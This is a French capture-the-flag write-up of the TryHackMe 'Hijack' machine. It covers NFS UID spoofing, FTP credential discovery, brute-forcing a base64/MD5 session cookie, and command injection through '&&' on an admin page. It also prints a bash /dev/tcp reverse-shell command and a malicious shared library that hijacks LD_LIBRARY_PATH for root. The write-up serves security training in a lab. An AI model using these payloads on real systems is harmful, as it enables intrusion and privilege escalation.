# CHALL : Hijack

# Information Gathering
IP : 10.10.211.179

Il y a un site web avec quelques champs mais pas grand choses de plus, il est en travaux.

# Enumeration
## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 04:56 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.211.179
Host is up (0.036s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      41251/udp6  mountd
|   100005  1,2,3      49476/tcp6  mountd
|   100005  1,2,3      57327/udp   mountd
|   100005  1,2,3      60874/tcp   mountd
|   100021  1,3,4      38315/udp   nlockmgr
|   100021  1,3,4      43030/tcp6  nlockmgr
|   100021  1,3,4      43184/tcp   nlockmgr
|   100021  1,3,4      48698/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
43184/tcp open  nlockmgr 1-4 (RPC #100021)
47053/tcp open  mountd   1-3 (RPC #100005)
54600/tcp open  mountd   1-3 (RPC #100005)
60874/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
# Exploitation
## RPC
On peu voir le dossier ptg ici :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Hijack]
└─$ showmount -e 10.10.211.179    
Export list for 10.10.211.179:
/mnt/share *
```
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Hijack]
└─$ sudo mount -t nfs 10.10.211.179:/mnt/share /home/kali/Challenge/TryHackMe/Hijack/Shared
                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Hijack]
└─$ ls -la 
total 150708
drwxr-xr-x  4 kali kali      4096 May  2 06:13 .
drwxr-xr-x 70 kali kali      4096 May  2 04:53 ..
-rwxr-xr-x  1 kali kali      6181 May  2 05:25 40136.py
-rwxr-xr-x  1 kali kali      6165 May  2 05:24 40136.py.bak
-rw-r--r--  1 kali kali 154275964 May  2 05:17 hydra.restore
drwxr-xr-x  4 kali kali      4096 May  2 05:38 nfsshell
-rw-r--r--  1 root kali      2257 May  2 04:56 nmap.txt
-rw-r--r--  1 kali kali         0 May  2 04:54 note.md
-rw-r--r--  1 kali kali       552 May  2 06:10 req.txt
drwx------  2 1003 1003      4096 Aug  8  2023 Shared
```
On peu le mount mais on ne peux rien faire dessus. Mais je constate que le permissions sont différente
```
drwx------  2 1003 1003      4096 Aug  8  2023 Shared
```
On peux voir ici que l'utilisateur et group sont **1003**
Sur hacktricks on peux lire qu'il est possible de créer un user local avec le même UID, et qu'il est donc possible d'avoir les bonnes permissions pour accèder au dossier :
```
If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder.
```
On va donc créer un user **test1**
```
sudo useradd test1
```
puis modifier le fichier **/etc/passwd** pour changer son **UID**:
```
test1:x:1003:1003:,,,:/home/test1:/bin/bash
```
Et nous pouvons entrer dans le dossier
```
test1@kali:/home/kali/Challenge/TryHackMe/Hijack/Shared$ ls -la
total 12
drwx------ 2 test1 1003 4096 Aug  8  2023 .
drwxr-xr-x 4 kali  kali 4096 May  2 06:13 ..
-rwx------ 1 test1 1003   46 Aug  8  2023 for_employees.txt
```
J'y trouve les creds pour le FTP
```
test1@kali:/home/kali/Challenge/TryHackMe/Hijack/Shared$ cat for_employees.txt 
ftp creds :

f[...REDACTED...]r:W[...REDACTED...]4
```
## FTP
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Hijack]
└─$ ftp 10.10.211.179
Connected to 10.10.211.179.
220 (vsFTPd 3.0.3)
Name (10.10.211.179:kali): f[...REDACTED...]er
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||19747|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.
```
On a 2 fichiers intéressant, le 1er, **.from_admin.txt**
```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
et **.passwords_list.txt** qui contient une liste de password.
```
[...]
H9xU8JpFqHHPxcXkRrG6
q9eZnWjs3SnqTPvRHXwR
2tR9ZTwKXBVfDYq9KQfQ
9etkUf4tQemLKJBYvVQm
[...]
```
Je sais qu'il existe un compte **admin** car la page login est parlant et indique si le username ou le mdp est incorrect.
Je test un brute-force mais je me fait bloquer...

Dans BurpSuite, grace au fait que quand on surligne, il décode automatiquement, je constate que le cookie PHPSESSID:
```
Cookie: PHPSESSID=dGVzdDpjYzAzZTc0N2E2YWZiYmNiZjhiZTc2NjhhY2ZlYmVlNQ%3D%3D
```
est encoder en URL
```
Cookie: PHPSESSID=dGVzdDpjYzAzZTc0N2E2YWZiYmNiZjhiZTc2NjhhY2ZlYmVlNQ==
```
puis en base64
```
test:cc03e747a6afbbcbf8be7668acfebee5
```
Le hash du mdp est en MD5 lui.

Après de looooooooooooongue recherche car je ne savais pas comment faire ! Je trouve un moyen de le bruteforce avec BurpSuite:

J'ouvre la page admin et capture la requete avec burpsuite, ensuite je l'envoi vers l'intruder.

Dans l'onglet **payload**, je met la liste de mot de passe que j'ai pris sur le FTP et configure burpsuite comme ceci:
Dans **PAYLOAD PROCCESSING** :
```
Hash:md5
Add Prefix: admin:
Base64-encode
```
Donc, on lui indique que le hash est en md5, qu'il doit ajouter le préfix **admin:** et qu'il encoder en base64 avant de test
Donc le cookie PHPSESSID sera comme ceci :
```
PHPSESSID=admin:PASSWORD_EN_MD5
```
Il y a un résultat :
```
GET /administration.php HTTP/1.1
Host: 10.10.211.179
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=YWRtaW4[...REDACTED...]U%3d
Upgrade-Insecure-Requests: 1
```
```
HTTP/1.1 200 OK
Date: Thu, 02 May 2024 10:33:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 864
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<html>
<head>
    <title>Administration Page</title>
</head>

[...]

</body>
</html>
```
J'ai donc le cookie admin, il donne cela une fois décodé:
```
admin:d65[...REDACTED...]20a5
```
La page administrateur permet de voir le status des services en ligne sur la machine.
Quand je recherche SSH, j'obtient ce résultat :
```
* ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Thu 2024-05-02 08:54:45 UTC; 1h 59min ago
  Process: 1082 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
 Main PID: 1128 (sshd)
    Tasks: 1
   Memory: 1.6M
      CPU: 238ms
   CGroup: /system.slice/ssh.service
           `-1128 /usr/sbin/sshd -D
```
Pour cela, il envoi forcement une commande dans un shell et capture le résultat pour le renvoyer. On va tenter d'injecter des commandes.
Il n'y a visiblement pas beaucoup de filtre....

Le pipe est filtré:
```
ssh | id
```
```
Command injection detected, please provide a service.
```
mais **&&** ne l'est pas !
```
ssh && id
```
```
* ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Thu 2024-05-02 08:54:45 UTC; 2h 0min ago
  Process: 1082 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
 Main PID: 1128 (sshd)
    Tasks: 1
   Memory: 1.6M
      CPU: 238ms
   CGroup: /system.slice/ssh.service
           `-1128 /usr/sbin/sshd -D
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
On peu donc executer des commandes sur le serveur.


On peux voir par exemple la présence de ce script dans **/var/www/html**
```service_status.sh
#!/bin/bash

service_name=$1
status=$(systemctl status "$service_name")

echo "$status"
```
Qui est executer quand on cherche un service ou la page administration.php
```administration.php
prepare("SELECT * FROM users WHERE username = ? AND password = ?");
  // Bind parameters
  $stmt->bind_param("ss", $username, $password_hash);
  // Execute the query
  $stmt->execute();
  // Get the result
  $result = $stmt->get_result();
  // If a matching user is found, the user is logged in
  if ($result->num_rows == 1) {
      // Set the session variables
      $_SESSION['loggedin'] = true;
      $_SESSION['username'] = $username;
  }
  // Close the statement
  $stmt->close();
}

if ( $password_hash !== 'd65[...REDACTED...]0a5' || $username !== 'admin') {
    echo "Access denied, only the admin can access this page.";
    exit();
}
?>
```
Ou on peu spawn un revshell :
```
ssh && bash -c "bash -i >& /dev/tcp/10.11.50.195/4444 0>&1"
```
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Hijack]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.63.56] 52578
bash: cannot set terminal process group (1292): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Hijack:/var/www/html$
```
# Post-Exploitation
Une fois un shell obtenu, on commence a cherche un moyen de faire une escalade de privilège.
Après avoir regarder dans le /home, l'historique, etc. Je télécharge Linpeas pour m'aider à trouver des pistes.


Avec linpeas, je trouve un mdp dans une config PHP:
```
╔══════════╣ Searching passwords in config PHP files
$password = "N3[...REDACTED...]Up";
```
Et c'est surement le mdp de Rick !
```
www-data@Hijack:/tmp$ su rick
Password: N3[...REDACTED...]Up
rick@Hijack:/tmp$
```
Le flag user ce trouve dans **/home/rick/user.txt**

## Root 
```
rick@Hijack:~$ sudo -l
[sudo] password for rick: N3[...REDACTED...]Up

Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
J'ai peut-être trouver un moyen avec LD_LIBRARY_PATH.

*LD_LIBRARY_PATH est une variable d'environnement prédéfinit sur les systèmes Linux/Unix qui indique au linker où trouver les librairies partagées*

Avec la commande **ldd**, on va regarder les libs utilisé par apache2:
```
rick@Hijack:~$ ldd /usr/sbin/apache2
ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffc27dec000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f2721334000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f272110d000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f2720edb000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f2720cbe000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f27208f4000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f27206bc000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f2720493000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f272028e000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f272008a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f2721849000)
```
On va dans le dossier **/tmp** puis on créer un shell en C:
```shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
Ensuite, on le compile:
```
rick@Hijack:/tmp$ gcc -fPIC -shared -o libdl.so.2 shell.c -nostartfiles
```
Voila, notre shell est créer est ce nomme **libdl.so.2**
Ensuite, on va executer **/usr/sbin/apache2** mais en lui indiquant un nouveau path pour les libs:
```
rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
et nous voila root :
```
root@Hijack:/tmp# cat /root/root.txt

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{[...REDACTED...]}
root@Hijack:/tmp# 
```
Ce qu'on à fait concrétement:

1) On créer un shell avec le nom d'une librairie utilisé par apache2
2) On execute apache2 avec en précisant le chemin de notre nouvelle librairie: **sudo LD_LIBRARY_PATH=/notre/dossier/ou/ce/trouve/le/shell apache2**
3) Apache2 s'execute et charge ses librairies
4) Il va charger **libdl.so.2** qui est notre shell et donc l'executer
5) apache2 est en erreur, mais nous avons notre shell.
